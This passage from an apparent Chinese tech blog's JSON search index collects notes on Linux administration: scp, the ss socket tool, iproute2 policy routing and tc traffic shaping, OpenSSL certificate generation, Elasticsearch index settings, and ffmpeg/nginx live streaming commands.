scp","title":"Linux命令 scp","text":"-a 尽可能将档案状态、权限等资料都照原状予以复制。\n-r 若 source 中含有目录名，则将目录下之档案亦皆依序拷贝至目的地。\n-f 若目的地已经有相同档名的档案存在，则在复制前先予以删除再行复制。\n本地文件 -  服务器\n如果是复制文件夹，使用\n    scp -r folder xiezf@192.168.248.124:/home/push\n    scp -P2222 -r video root@deedbeef.com:/\n\n复制文件到远程目录\n    scp file xiezf@192.168.248.124:/home/push\n 本地文件 \u003c- 服务器  \n反过来操作，把文件从远程主机copy到当前系统\n  scp  root@139.129.108.163:/etc/streaming/easydarwin.xml easydarwin.xml","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 ss","title":"Linux命令 ss","text":"Linux网络状态工具ss命令使用详解\n\nsudo  ss -tl sport eq 8080 -K 关闭监听的8080端口\n -l 只显示监听的端口（默认：不加参数 显示连接的端口）\n -t 只显示tcp连接\n -K --kill 杀进程 \n\n-r, --resolve       resolve host names\n-n, --numeric       don't resolve service names 不解析服务\n-a, --all           display all sockets\n-l, --listening     display listening sockets\n-p, --processes     show process using socket\n\n-4, --ipv4          display only IP version 4 sockets\n-6, --ipv6          display only IP version 6 sockets\n-0, --packet        display PACKET sockets\n-t, --tcp           display only TCP sockets\n-u, --udp           display only UDP sockets\n-d, --dccp          display only DCCP sockets\n-w, --raw           display only RAW sockets\n-x, --unix          display only Unix domain sockets\n\nss命令用于显示socket状态. 他可以显示PACKET sockets, TCP sockets, UDP sockets, DCCP sockets, RAW sockets, Unix domain sockets等等统计. 它比其他工具展示等多tcp和state信息. 它是一个非常实用、快速、有效的跟踪IP连接和sockets的新工具.SS命令可以提供如下信息：\n\n  所有的TCP sockets\n  所有的UDP sockets\n  所有ssh/ftp/ttp/https持久连接\n  所有连接到Xserver的本地进程\n  使用state（例如：connected, synchronized, SYN-RECV, SYN-SENT,TIME-WAIT）、地址、端口过滤\n  所有的state FIN-WAIT-1 tcpsocket连接以及更多\n\n很多流行的Linux发行版都支持ss以及很多监控工具使用ss命令.熟悉这个工具有助于您更好的发现与解决系统性能问题.本人强烈建议使用ss命令替代netstat部分命令,例如netsat -ant/lnt等.\n\n展示他之前来做个对比,统计服务器并发连接数\n netstat\ntime netstat -ant | grep EST | wc -l\n3100\nreal 0m12.960s\nuser 0m0.334s\nsys 0m12.561s\n time ss -o state established | wc -l\n3204\nreal 0m0.030s\nuser 0m0.005s\nsys 0m0.026s\n\nss -tpl 显示监听的TCP连接 并显示具体进程\nss\n\n结果很明显ss统计并发连接数效率完败netstat,在ss能搞定的情况下, 你还会在选择netstat吗, 还在犹豫吗, 看以下例子,或者跳转到帮助页面.\n\n常用ss命令：\nss -l 显示本地打开的所有端口\nss -pl 显示每个进程具体打开的socket\nss -t -a 显示所有tcp socket\nss -u -a 显示所有的UDP Socekt\nss -o state established '( dport = :smtp or sport = :smtp )' 显示所有已建立的SMTP连接\nss -o state established '( dport = :http or sport = :http )' 显示所有已建立的HTTP连接\nss -x src /tmp/.X11-unix/ 找出所有连接X服务器的进程\nss -s 列出当前socket详细信息:\n\n过滤器\nautobound  -- socket bound to ephemeral port\n\nstate      -- sockets in specified state\nexclude    -- sockets not in specified state\nsrc        -- local address/port of socket\ndst        -- peer address/port of socket\nsport      -- local port\ndport      -- peer port\n'(    )'    \n\n条件选择\n\n= or le : 小于等于 = or ge : 大于等于\n or eq : 等于\n!= or ne : 不等于端口\n or lt : 小于这个端口  or gt : 大于端口\n\nss -o state established '( dport = :http or sport = :http )'\n\n显示sockets简要信息\n列出当前已经连接，关闭，等待的tcp连接\nss -s\nTotal: 3519 (kernel 3691)\nTCP: 26557 (estab 3163, closed 23182, orphaned 194, synrecv 0, timewait 23182/0), ports 1452\n\nTransport Total IP IPv6\n3691 - -\nRAW 2 2 0\nUDP 10 7 3\nTCP 3375 3368 7\nINET 3387 3377 10\nFRAG 0 0 0\n\n列出当前监听端口\n ss -l\nRecv-Q Send-Q Local Address:Port Peer Address:Port\n0 10 :::5989 :::\n0 5 :rsync :\n0 128 :::sunrpc :::\n0 128 :sunrpc :\n0 511 :http :\n0 128 :::ssh :::\n0 128 :ssh :\n0 128 :::35766 :::\n0 128 127.0.0.1:ipp :\n0 128 ::1:ipp :::\n0 100 ::1:smtp :::\n0 100 127.0.0.1:smtp :\n0 511 :https :\n0 100 :::1311 :::\n0 5 :5666 :\n0 128 :3044 :\n\nss列出每个进程名及其监听的端口\nss -pl\n\nss列所有的tcp sockets\n ss -t -a\nss列出所有udp sockets\nss -u -a\nss列出所有http连接中的连接\n ss -o state established '( dport = :http or sport = :http )'\n\n·以上包含对外提供的80，以及访问外部的80\n·用以上命令完美的替代netstat获取http并发连接数，监控中常用到\n\nss列出本地哪个进程连接到x server\nss -x src /tmp/.X11-unix/\nss列出处在FIN-WAIT-1状态的http、https连接\n ss -o state fin-wait-1 '( sport = :http or sport = :https )'\n\nss常用的state状态：\nestablished\nsyn-sent\nsyn-recv\nfin-wait-1\nfin-wait-2\ntime-wait\nclosed\nclose-wait\nlast-ack\nlisten\nclosing\nall : All of the above states\nconnected : All the states except for listen and closed\nsynchronized : All the connected states except for syn-sent\nbucket : Show states, which are maintained as minisockets, i.e. time-wait and syn-recv.\nbig : Opposite to bucket state.\n\nss使用IP地址筛选\nss src ADDRESSPATTERN\nsrc：表示来源\nADDRESSPATTERN：表示地址规则\n\n如下：\nss src 120.33.31.1 # 列出来之20.33.31.1的连接\n\n＃　列出来至120.33.31.1,80端口的连接\nss src 120.33.31.1:http\nss src 120.33.31.1:80\n\nss src ADDRESSPATTERN\nsrc：表示来源\nADDRESSPATTERN：表示地址规则\n\n如下：\nss src 120.33.31.1 # 列出来之20.33.31.1的连接\n\n＃　列出来至120.33.31.1,80端口的连接\nss src 120.33.31.1:http\nss src 120.33.31.1:80\n\nss使用端口筛选\nss dport OP PORT\nOP:是运算符\nPORT：表示端口\ndport：表示过滤目标端口、\nsport: 本机监听端口\n\nOP运算符如下：\n= or le : 小于等于 = or ge : 大于等于\n or eq : 等于\n!= or ne : 不等于端口\n or lt : 小于这个端口  or gt : 大于端口\n\nOP实例\nss sport = :http 也可以是 ss sport = :80\nss dport = :http\nss dport \\  :1024\nss sport \\  :1024\nss sport \\\u003c :32000\nss sport eq :22\nss dport != :22\nss state connected sport = :http\nss \\( sport = :http or sport = :https \\)\nss -o state fin-wait-1 \\( sport = :http or sport = :https \\) dst 192.168.1/24\n\n为什么ss比netstat快：\nnetstat是遍历/proc下面每个PID目录，ss直接读/proc/net下面的统计信息。所以ss执行的时候消耗资源以及消耗的时间都比netstat少很多\n\nss命令帮助\nss -h\n-s, --summary       show socket usage summary\n\n-n, --numeric       don't resolve service names 不解析服务\n-r, --resolve       resolve host names\n\n-a, --all           display all sockets\n-l, --listening     display listening sockets\n-p, --processes     show process using socket\n\n-o, --options       show timer information\n-e, --extended      show detailed socket information\n-m, --memory        show socket memory usage\n-i, --info          show internal TCP information\n-b, --bpf           show bpf filter socket information\n-E, --events        continually display sockets as they are destroyed\n-Z, --context       display process SELinux security contexts\n-z, --contexts      display process and socket SELinux security contexts\n-N, --net           switch to the specified network namespace name\n\n-4, --ipv4          display only IP version 4 sockets\n-6, --ipv6          display only IP version 6 sockets\n-0, --packet        display PACKET sockets\n-t, --tcp           display only TCP sockets\n-u, --udp           display only UDP sockets\n-d, --dccp          display only DCCP sockets\n-w, --raw           display only RAW sockets\n-x, --unix          display only Unix domain sockets\n-f, --family=FAMILY display sockets of type FAMILY\n\n-A, --query=QUERY, --socket=QUERY\n   QUERY := {all|inet|tcp|udp|raw|unix|unixdgram|unixstream|unixseqpacket|packet|netlink}[,QUERY]\n\n-D, --diag=FILE     Dump raw information about TCP sockets to FILE\n-F, --filter=FILE   read filter information from FILE\n\nFILTER := [ state STATE-FILTER ] [ EXPRESSION ]\nSTATE-FILTER := {all|connected|synchronized|bucket|big|TCP-STATES}\n   connected := {established|syn-sent|syn-recv|fin-wait-{1,2}|time-wait|close-wait|last-ack|closing}\nsynchronized := {established|syn-recv|fin-wait-{1,2}|time-wait|close-wait|last-ack|closing}\n      bucket := {syn-recv|time-wait}\n         big := {established|syn-sent|fin-wait-{1,2}|closed|close-wait|last-ack|listen|closing}\n  TCP-STATES := {established|syn-sent|syn-recv|fin-wait-{1,2}|time-wait|closed|close-wait|last-ack|listen|closing}\n\n-f FAMILY, --family=FAMILY\n             Display  sockets  of type FAMILY.  Currently the following fami‐\n             lies are supported: unix, inet, inet6, link, netlink.\n\n      -A QUERY, --query=QUERY, --socket=QUERY\n             List of socket tables to dump, separated by commas. The  follow‐\n             ing  identifiers are understood: `all, inet, tcp, udp, raw, unix,\n             packet,  netlink,   unixdgram,   unixstream,   unixseqpacket,\n             packetraw, packetdgram`.\n\n      -D FILE, --diag=FILE\n             Do  not  display  anything,  just dump raw information about TCP\n             sockets to FILE after applying filters. If FILE is -  stdout  is\n             used.\n\n      -F FILE, --filter=FILE\n             Read  filter information from FILE.  Each line of FILE is inter‐\n             preted like single command line option. If FILE is  -  stdin  is\n             used.\n\n      FILTER := [ state STATE-FILTER ] [ EXPRESSION ]\n             Please take a look at the official documentation (Debian package\n             iproute-doc) for details regarding filters.\n\nSTATE-FILTER\n      STATE-FILTER allows to construct arbitrary set of states to match.  Its\n      syntax is sequence of keywords state and exclude followed by identifier\n      of state.\n\n      Available identifiers are:\n\n             All standard TCP states: established, syn-sent,  syn-recv,  fin-\n             wait-1,  fin-wait-2,  time-wait,  closed,  close-wait, last-ack,\n             listen and closing.\n\n             all - for all the states\n\n             connected - all the states except for listen and closed\n\n             synchronized - all the connected states except for syn-sent\n\n             bucket - states,  which  are  maintained  as  minisockets,  i.e.\n             time-wait and syn-recv\n\n             big - opposite to bucket\n\n参考：http://www.cyberciti.biz/tips/linux-investigate-sockets-network-connections.html","tags":null},{"location":"//blog.pytool.com/Hacker/00_nettools/2015-03-29 iproute2策略路由与流量控制笔记","title":"iproute2 策略路由与流量控制笔记","text":"iproute2 策略路由与流量控制笔记\n\n-- 前提知识: --\n如果需要使用策略路由需确认编译内核时配置中带有IP:advanced route和IP:policy routing\n\niproute匹配条件:from源地址,to目的地址，Tos域,Dev物理接口,Fwmark防火墙标记  这些做为匹配条件\n\niproute动作：可以以table指明所用的表,nat网络地址转换,prohibit丢弃并发送icmp信息,reject单纯丢弃,unreachable丢弃并发送icmp信息.\n\nip rule首先程序从优先级高到低扫描所有的规则，如果规则匹配，处理该规则的动作。如果是普通的路由寻址或者是nat地址转换的换，首先从规则得到路由表，然后对该路由表进行操作。这样RPDB(routing policy database)终于清晰的显现出来了。\n\niproute相关的内核编译选项:CONFIGIPADVANCEDROUTER=y CONFIGIPMULTIPLETABLES=y CONFIGIPROUTEFWMARK=y\n\n/etc/iproute2/rttables 保存规则的名字与数字的关联\n\niptables -A FORWARD -p tcp -m tcp --tcp-flags SYN,RST SYN -j TCPMSS --clamp-mss-to-pmtu 允许调整tcp syn包里的MSS域，用于控制连接包的最大长度。一些防火墙或主机会很不适当的过滤掉type 3、code 4（需要分片）的icmp包。目前发行的linux的内核从2.4.7开始已经包含了这个补丁。\n\nIMQ 中介队列设备\n被打了特定标记的数据包在netfilter的NFIPPREROUTING和NFIPPOSTROUTING两个钩子函数处被拦截，并被送到一个队列规定中,该队列规定附加到一个IMQ设备上。可以实现对入口流量整形，而且可以把网卡当成一个个的类来看待而进行全局整形设置。\n\n--应用案例1 --\n\n通过iptables与iproute2协同实现根据 应用 的策略路由\n实现要点： iptables根据端口将服务类的数据包打上标示，iptables -t mangle -A PREROUTING -p tcp --dport 80 -j MARK --set-mark 100 （用这些标记我们可以做带宽限制和基于请求的分类）\n根据情况做nat iptables -t nat -A POSTROUTING -o eth2 -j MASQUERADE\n然后设置路由策略ip rule add fwmark 100 table 100\n\n-- 应用案例2 --\n\n普通双ISP的设置 外网接口$IF1 IF1接口地址$IP1 ISP1网关地址$P1 ISP1的网络地址P1NET\n分别指定两条默认网关负责单独的上行流\nip route add $P1NET dev $IF1 src $IP1 table T1 源地址为IP1且目的为ISP1网段从IF1接口发出(必需的,它能够让我们找到该子网内的主机及本网关) 将这条路由加入表T1\nip route add default via $P1 table T1\nip route add $P2NET dev $IF2 src $IP2 table T2 源地址为IP2且目的为ISP2网段从IF2接口发出((必需的,它能够让我们找到该子网内的主机及本网关) 将这条路由加入表T2\nip route add default via $P2 table T2\n\n也加入到main路由表\nip route add $P1NET dev $IF1 src $IP1\nip route add $P2NET dev $IF2 src $IP2\n  main缺省走ISP1\nip route add default via $P1\n\n设置路由规则\nip rule add from $IP1 table T1\nip rule add from $IP2 table T2\n设置负载均衡\nip route add default scope global nexthop via $P1 dev $IF1 weight 1 \\\nnexthop via $P2 dev $IF2 weight 1\n\n均衡是基于路由进行的，而路由是经过缓冲的,所以这样的均衡并不是100%精确.\n\n-- 应用案例3 --\n TC带宽管理的主要实现步骤 主要是在输出端口处建立一个队列进行流量控制，控制的方式是基于路由，亦即基于目的IP地址或目的子网的网络号的流量控制。\n1 编译内核时注意事项\n以下实例:发往A主机8M带宽 发往B主机1M带宽 发往C主机1M带宽\n2 　1) 针对网络物理设备(如以太网卡eth0)绑定一个CBQ队列；\n tc qdisc add dev eth0 root handle 1: cbq bandwidth 10Mbit avpkt 1000 cell 8 mpu 64\n　　2) 在该队列上建立分类；\n tc class add dev eth0 parent 1:0 classid 1:1 cbq bandwidth 10Mbit rate 10Mbit maxburst 20 allot \\ 1514 prio 8 avpkt 1000 cell 8 weight 1Mbit\n tc class add dev eth0 parent 1:1 classid 1:2 cbq bandwidth 10Mbit rate 8Mbit maxburst 20 allot \\ 1514 prio 2 avpkt 1000 cell 8 weight 800Kbit split 1:0 bounded\n tc class add dev eth0 parent 1:1 classid 1:3 cbq bandwidth 10Mbit rate 1Mbit maxburst 20 allot \\ 1514 prio 1 avpkt 1000 cell 8 weight 100Kbit split 1:0\n tc class add dev eth0 parent 1:1 classid 1:4 cbq bandwidth 10Mbit rate 1Mbit maxburst 20 allot \\ 1514 prio 6 avpkt 1000 cell 8 weight 100Kbit split 1:0\n　　3) 为每一分类建立一个基于路由的过滤器；\ntc filter add dev eth0 parent 1:0 protocol ip prio 100 route\ntc filter add dev eth0 parent 1:0 protocol ip prio 100 route to 2 flowid 1:2\ntc filter add dev eth0 parent 1:0 protocol ip prio 100 route to 3 flowid 1:3\ntc filter add dev eth0 parent 1:0 protocol ip prio 100 route to 4 flowid 1:4\n　　4) 最后与过滤器相配合，建立特定的路由表。\nip route add 192.168.1.24 dev eth0 via 192.168.1.66 realm 2\nip route add 192.168.1.30 dev eth0 via 192.168.1.66 realm 3\nip route add 192.168.1.0/24 dev eth0 via 192.168.1.66 realm 4\n3 应用,监控\n\n--关于负载平衡--\n关于负载平衡 CONFIGIPROUTEMULTIPATH内核选项将把所有这些路径(缺省路由)等同看待，然后再根据/usr/src/linux /Documentation/Configure.help来选择其特定的方式。Ip route命令的equalize选项，会让Linux内核基于IP地址平衡外部连接。对于一个特定的IP地址，内核会选择一个接口用于传输流出的数据包，然后内核会为该IP地址在路由缓冲中建一个记录。这样，其它到达的有相同IP地址的数据包就会使用同一个接口，直到该记录从路由缓冲中删除。我们可以使用ip route list cache命令来查看路由缓冲。\n\n通过DNS循环来实现的服务的负载平衡\n各种不同的服务(DNS、SMTP、HTTP、LDAP、SSH等) 可以通过DNS循环来实现。\n循环复用DNS还有太多的限制(DNS缓存,忽略TTL值，修改后的刷新时间,不能意识到服务器的可用性)，只能算是一种勉强可接受的负载平衡方案\n\n--相关命令 --\nip link list 显示链路\nip address show 显示IP地址 对于PPP0接口还会告诉我们链路另一端的地址\nip route show 输出结果之一default via x.x.x.x dev x\n\nip neigh show 查看缓存的ARP表\nip neigh delete x.x.x.x dev x\n\n--TC流量控制：--\n我们只能对发送数据进行整形\n默认整形方式是Pfifo_fast队列规定。特点为先进先出。只看数据包的TOS字节节来判断应该放到哪个频道(优先).一般的应用程序会如何设置他们的TOS值。\nHTB分层的令牌桶\nHTB 可以保障提供给每个类带宽的数量是它所需求的最小需求或者等于分配给它的数量.当一个类需要的带宽少于分配的带宽时,剩余的带宽被分配给其他需要服务的类.\n\nSFQ随机公平队列\n简单轮转。使用一个散列算法，把所有的会话映射到有限的几个队列中去。(只有当你的出口网卡确实已经挤满了的时候,SFQ才会起作用)\n\n（如果你并不希望进行流量整形，只是想看看你的网卡是否有比较高的负载而需要使用队列，可使用pfifo队列。它缺乏内部频道但是可以统计backlog）\n\n--HTB应用案例4--\n1)\ntc qdisc add dev eth0 root handle 1: htb default 12\n2)\ntc class add dev eth0 parent 1: classid 1:1 htb rate 100kbps ceil 100kbps\ntc class add dev eth0 parent 1:1 classid 1:10 htb rate 30kbps ceil 100kbps\ntc class add dev eth0 parent 1:1 classid 1:11 htb rate 10kbps ceil 100kbps\ntc class add dev eth0 parent 1:1 classid 1:12 htb rate 60kbps ceil 100kbps\n3)为队列规定分配子类, 如果没有指定缺省是pfifo\ntc qdisc add dev eth0 parent 1:10 handle 20: pfifo limit 5\ntc qdisc add dev eth0 parent 1:11 handle 30: pfifo limit 5\ntc qdisc add dev eth0 parent 1:12 handle 40: sfq perturb 10\n1:12队列的类不定义时，即所有不匹配其它类规则的数据包。\n\n--流量分析与故障诊断--\ntc -s -d qdisc show dev eth0 队列状态\ntc -s class show dev eth0 类状态\ntc filter show dev eth0 过滤器状态","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 openssl","title":"使用openssl制作证书","text":"---\n非对称加密算法：RSA，DSA/DSS\n对称加密算法：AES，RC4，3DES\nHASH算法：MD5，SHA1，SHA256\nChapter 7 OpenSSL\nOpenSSL生成根证书CA及签发子证书\n那些证书相关的玩意儿(SSL,X.509,PEM,DER,CRT,CER,KEY,CSR,P12等)\n数字证书及 CA 的扫盲介绍 @ 编程随想的博客\n数字签名与数字证书 - oscar999的专栏 - 博客频道 - CSDN.NET\n数字签名原理简介（附数字证书） - kingsleylam - 博客园\n 无密码加密传输  [公钥加密]\n\n解决源文件被修改的问题  [数字签名]\n\n 解决公钥加密速度慢的问题 [数字签名+对称加密]\n  B的公钥加密对称密钥  （加密密码）                      B的私钥解密 对称密钥（解密密码）\n  对称密钥加密原文    （密码）                          （解密）\n  A的私钥加密 摘要   （数字签名）                       A的公钥解密HASH\n\n解决信任问题 [证书+数字签名+对称加密]\n 用CA的公钥解开数字证书，就可以拿到B真实的公钥了，然后就能证明\"数字签名\"是否真的是鲍勃签的\n \n\n 证书格式转换\n\n 一些概念\n\n KEY : 私钥文件，决定ssl安全的基础\n CSR : Certificate Signing Request 证书请求文件，包含公钥和证书信息\n CA : 中级证书颁发机构，一般是可信的第三方，CA证书会验证公钥是否被认证\n root CA：通过它的私钥对中级机构提交的CSR进行了签名\n\n 申请ssl证书需要用到openssl，linux系统中默认会安装，手动安装openssl：\n\n yum install -y openssl openssl-devel\n\n一.生成私钥\n\n 私钥是SSL安全性的基础，使用RSA算法生成，只有证书申请者持有，即使CA也没有对私钥的访问权限，应妥善保管。私钥长度决定其安全性，2009年768位RSA已被破解，1024位RSA短期内是安全的，但随着计算机越来越快，已不足以抵御攻击，为了安全起见应尽量使用2048位RSA，生成2048位私钥：\n\n openssl genrsa -out 52os.net.key 2048\n\n 如果对安全性要求较高，可以用密码加密密钥文件，每次读取密钥都需输入密码：\n\n openssl genrsa -des3 -out 52os.net.key 2048\n\n 如何去除私钥密码保护\n\n  如果您的密钥已经加载密码保护，可以通过 OpenSSL 工具 运行以下命令去掉密码保护：\n\n  openssl rsa -in encryedprivate.key -out unencryed.key\n\n    encryedprivate.key 是带密码保护的私钥文件。\n    unencryed.key 是去掉了密码的私钥文件，扩展名为 key 或者 pem 均可。\n\n 二.生成CSR\n\n 证书签名请求文件（CSR）中包含了公钥和证书的详细信息，将CSR发送给CA认证后就会得到数字证书或证书链，生成CSR文件：\n\n openssl req -new -sha256 -key 52os.net.key -out 52os.net.csr\n 按照提示输入：国家、省份、城市、组织名、部门、公共名称、邮件地址等，最后的extra信息不要填写，个人用户也可以使用默认或留空，只需注意‘Common Name’是要使用ssl证书的域名，根据实际情况，可以写单域名，多个域名，或使用*通配域名\n 验证CSR文件信息：\n\n openssl req -noout -text -in  52os.net.csr\n 确认信息正确就可以提交给ca进行认证，CA会根据你的CSR文件进行签名，之后颁发数字证书，该数字证书和私钥就可以部署到服务器了；通常ca认证需付费，普通ssl证书不贵，也有一些提供免费的证书的ca，如startssl、Let's Encrypt等\n\n如何制作阿里云CSR文件?\n\n 三.自签名\n\n 在某些情况下，如内网https的应用，不需要付费使用第三方签名，此时就可以使用自签名证书。自签名分两种：\n\n 使用自己的私钥签发自己的csr生成证书，也可以直接生成私钥和证书\n\n 生成ca，使用ca签发\n\n 生成ca的好处是：客户只要手动信任该ca一次，即可信任该ca签发的所有证书，不需要为每个证书添加信任\n\n 3.1 使用自签名\n\n 使用上面生成的私钥签发证书：\n\n openssl x509 -req -days 365 -in 52os.net.csr -extensions v3ca -signkey  52os.net.key  -out 52os.net365.crt\n 或者直接生成私钥和证书：\n\n openssl  req -x509 -nodes -days 3650 -newkey rsa:2048 -keyout 52os.net.key -out 52os.net.crt\n 可以使用chrome浏览器导出证书并安装到windows信任证书中，安装后浏览器地址栏的https就会变成绿色。导出方法：访问https网站，点击地址栏上有红色叉的锁型图标，点击详细信息，点击查看证书，在弹出的证书窗口中点击详细信息选项卡，点击复制到文件，之后按证书导出向导的提示即可导出\n\n 3.2 使用ca签名\n\n 生成 CA:\n\n openssl genrsa -out CA.key 2048\n openssl req -new -x509 -key CA.key -out CA.cer -days 36500 -subj /CN='52os CA'\n 使用ca签发证书：\n\n openssl x509 -req -in 52os.net.csr -extensions v3usr -CA CA.cer  -CAkey CA.key  -CAcreateserial -out 52os.net.crt\n 为了更好的兼容浏览器，还需：\n\n cat CA.cer     52os.net.crt\n 客户端手动信任CA.cer即可，windows下可以双击安装\n\n 参考文章：\n http://www.51ean.com/interaction/safetyinformation_details.html?postId=585\n http://blog.csdn.net/tenfyguo/article/details/40922813\n http://www.wosign.com/Basic/index.htm\n http://www.cnblogs.com/kyrios/p/tls-and-certificates.html\n\nHTTPS:\n  server 生成crt.pub\n  client 生成 random key                            server 生成对称密钥\n  通过对称密钥加密\n\n之前没接触过证书加密的话,对证书相关的这些概念真是感觉挺棘手的,因为一下子来了一大堆新名词,看起来像是另一个领域的东西,而不是我们所熟悉的编程领域的那些东西,起码我个人感觉如此,且很长时间都没怎么搞懂.写这篇文章的目的就是为了理理清这些概念,搞清楚它们的含义及关联,还有一些基本操作.\nSSL\n\nSSL - Secure Sockets Layer,现在应该叫\"TLS\",但由于习惯问题,我们还是叫\"SSL\"比较多.http协议默认情况下是不加密内容的,这样就很可能在内容传播的时候被别人监听到,对于安全性要求较高的场合,必须要加密,https就是带加密的http协议,而https的加密是基于SSL的,它执行的是一个比较下层的加密,也就是说,在加密前,你的服务器程序在干嘛,加密后也一样在干嘛,不用动,这个加密对用户和开发者来说都是透明的.More:[维基百科]\n\nOpenSSL - 简单地说,OpenSSL是SSL的一个实现,SSL只是一种规范.理论上来说,SSL这种规范是安全的,目前的技术水平很难破解,但SSL的实现就可能有些漏洞,如著名的\"心脏出血\".OpenSSL还提供了一大堆强大的工具软件,强大到90%我们都用不到.\n证书标准\n\nX.509 - 这是一种证书标准,主要定义了证书中应该包含哪些内容.其详情可以参考RFC5280,SSL使用的就是这种证书标准.\n编码格式\n\n同样的X.509证书,可能有不同的编码格式,目前有以下两种编码格式.\n\nPEM - Privacy Enhanced Mail,打开看文本格式,以\"","tags":null},{"location":"//blog.pytool.com/Post/Elastic/ElasticSearch/2016-10-04  [Elasticsearch] 向已存在的索引中添加自定义filter/analyzer","title":"向已存在的索引中添加自定义filter analyzer","text":"问题描述\n\n随着应用的不断升级，索引中的类型也会越来越多，新增加的类型中势必会使用到一些自定义的Analyzer。但是通过settings端点的更新API不能直接在已经存在的索引上使用。在sense中进行更新时会抛出异常：\n\nPUT /symbol\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"edgengram\": {\n           \"type\": \"edgeNGram\",\n           \"mingram\": \"1\",\n           \"maxgram\": \"255\"\n        }\n      },\n      \"analyzer\": {\n        \"symbolanalyzer\": {\n          \"type\": \"custom\",\n          \"charfilter\": [],\n          \"tokenizer\": \"standard\",\n          \"filter\": [\n            \"lowercase\",\n            \"worddelimiter\"\n          ]\n        },\n        \"backedgengramanalyzer\": {\n          \"type\": \"custom\",\n          \"charfilter\": [],\n          \"tokenizer\": \"whitespace\",\n          \"filter\": [\n            \"reverse\",\n            \"edgengram\",\n            \"reverse\"\n          ]\n        }\n      }\n    }\n  }\n}\n\n上例中，我们希望向名为symbol的索引中添加一个filter和两个analyzers。但是会抛出如下的错误信息：\n\n{\n   \"error\": \"IndexAlreadyExistsException[[symbol] already exists]\",\n   \"status\": 400\n}\n\n提示我们该索引已经存在了，无法添加。\n解决方案\n\n最直观的解决方案是首先备份该索引中已经存在的数据，然后删除它再重建该索引。这种方式比较暴力，当索引中已经存在相当多的数据时，不建议这样做。\n\n另外一种方案是使用open和close这一对端点，首先将目标索引关闭，执行需要的更新操作，然后再打开该索引。\n\nPOST /symbol/close\n\nPUT /symbol/settings\n{\n  \"settings\": {\n    ....    \n  }\n}\n\nPOST /symbol/_open\n\n这样就避免了需要重建索引的麻烦。有了新添加的filter和analyzer，就可以根据需要再对types中的mappings进行更新了。","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 FFmpeg","title":"Linux命令 ffmpeg","text":"FFmpeg基础\nFFmpeg基本用法\nFFmpeg常用基本命令\nffmpeg 使用小记\nffmpeg常用转换命令，支持WAV转AMR\n用ffmpeg+nginx服务器实现类似酒店视频直播系统\nffmpeg推送,EasyDarwin转发,vlc播放 实现整个RTSP直播\nffmpeg处理RTMP流媒体的命令大全\nffmpeg RTMP\nFFmpeg获取DirectShow设备数据（摄像头，录屏）\n基于Nginx搭建mp4/flv流媒体服务器\nM3U8 的简单实现 nginx+ffmpeg\n使用FFmpeg生成HLS视频\n##############################\n ffmpeg强制使用TCP方式读取rtsp流\n “ffmpeg -rtsptransport tcp -i rtsp://admin.......”\n#######\n\n##############################\n内存虚拟硬盘\nsudo mkdir /mnt/ramdisk\n\nsudo mount -t tmpfs tmpfs /mnt/ramdisk  -o size=2G,defaults,noatime,mode=777\nsudo mkdir -p /mnt/ramdisk/hls/mystream/\n ffmpeg -loglevel verbose -re -i Android.mp4  -vcodec libx264 -vprofile baseline -acodec libmp3lame -ar 44100 -ac 1    -f flv rtmp://localhost:1935/hls/movie\nffmpeg -loglevel verbose -re -i demo.mp4  -vcodec libx264 -vprofile baseline -acodec libmp3lame -ar 44100 -ac 1    -f flv rtmp://localhost:1935/hls/mystream\n推送HLS直播\nffmpeg -re -i demo.mp4 -c:v libx264 -c:a aac -f hls -hlslistsize 5 -hlswrap 5 /mnt/ramdisk/hls/mystream/index.m3u8\nsudo ffmpeg -re -i demo.mp4 -c:v libx264 -c:a copy -f hls -hlslistsize 5 -hlswrap 5 /mnt/ramdisk/hls/mystream/index.m3u8\nsudo ffmpeg -re -i demo.mp4 -c:v libx264 -c:a copy -f hls -hlslistsize 5 -hlswrap 5 /home/ubuntu/EasyDarwin/EasyDarwin/x64/Movies/hls/mystream/index.m3u8\n\nsudo ffmpeg -re -i demo.mp4 -c:v copy -acodec copy  -f rtsp rtsp://139.129.108.163:6554/test.sdp\nsudo ffmpeg -re -i demo.mp4 -vcodec copy -acodec copy  -rtsptransport tcp -f rtsp rtsp://139.129.108.163:6554/test.sdp\n\nsudo ffmpeg -re -i demo.mp4 -vcodec copy -acodec copy  -rtsptransport tcp -f rtsp rtsp://121.40.50.44:554/test.sdp\n1.点播\n在对应路径下直接可以播放\n2.rtsp直播\nffmpeg -re -i localFile.mp4 -c copy -f flv rtmp://server/live/streamName  \n3.实现hls直播\nrtmp{\n    server {\n        listen 1935;\n\n        application myapp {\n            live on;\n            exec ffmpeg -i rtmp://localhost/myapp/$name -c:a copy  -c:v libx264 -b:v 512K -g 30 -f flv rtmp://localhost/hls/$namelow;\n        }\n\n        application hls {\n            live on;\n            hls on;\n            hlspath /mnt/ramdisk/hls;\n            hlsnested on;\n            hlsfragment 2s;\n            hlsplaylistlength 6s;\n            hlsvarianthi  BANDWIDTH=640000;\n        }\n    }\n}\nhttp{\n    server {\n        location /hls {\n            types {\n                application/x-mpegURL m3u8;\n                application/vnd.apple.mpegusr m3u8;\n                video/mp2t ts;\n            }\n            root /mnt/ramdisk;\n             alias /usr/local/nginx/html/hls/;\n            addheader Cache-Control no-cache;\n        }   \n    }\n}\n\nffmpeg -loglevel verbose -re -i demo.mp4  -vcodec libx264 -vprofile baseline -acodec libmp3lame -ar 44100 -ac 1    -f flv rtmp://localhost:1935/hls/mystream\n测试地址\nhttp://127.0.0.1:8080/hls/mystream.m3u8\n\nhttp://192.168.1.108/hls/mystream/index.m3u8\n\nNginx RTMP\n\n实现rtmp 转播\nffmpeg -i rtsp://218.204.223.237:554/live/1/67A7572844E51A64/f68g2mj7wjua3la7.sdp -vcodec copy -acodec copy  -f flv rtmp://localhost:1935/myapp/mystream\n实现hls转播\nffmpeg -i rtsp://218.204.223.237:554/live/1/67A7572844E51A64/f68g2mj7wjua3la7.sdp -vcodec copy -acodec copy  -f flv rtmp://localhost:1935/hls/mystream\n\n#easyDarwin###############\n[ffmpeg推送,EasyDarwin转发,vlc播放 实现整个RTSP直播]\n2、例如，我们的摄像机地址是 rtsp://admin:admin@192.168.66.119/，ffmpeg命令如下：\nffmpeg -i rtsp://218.204.223.237:554/live/1/67A7572844E51A64/f68g2mj7wjua3la7.sdp -vcodec 